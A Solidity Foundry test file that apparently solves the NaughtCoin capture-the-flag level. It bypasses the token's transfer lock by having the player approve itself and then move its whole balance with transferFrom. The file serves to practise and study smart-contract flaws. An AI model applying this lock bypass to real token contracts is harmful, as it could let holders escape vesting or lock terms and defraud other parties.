// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/14-NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public naughtCoinCTF;
    address public player = address(0x1);
    address public receiver = address(0x2);

    function setUp() public {
        naughtCoinCTF = new NaughtCoin(player);
    }

    function testAttack() public {
        uint256 totalSupply = naughtCoinCTF.INITIAL_SUPPLY();

        assertEq(naughtCoinCTF.balanceOf(receiver), 0);
        assertEq(naughtCoinCTF.balanceOf(player), totalSupply);

        // attack
        vm.startPrank(player);
        naughtCoinCTF.increaseAllowance(player, totalSupply);
        naughtCoinCTF.transferFrom(player, receiver, totalSupply);

        assertEq(naughtCoinCTF.balanceOf(receiver), totalSupply);
        assertEq(naughtCoinCTF.balanceOf(player), 0);
    }
}
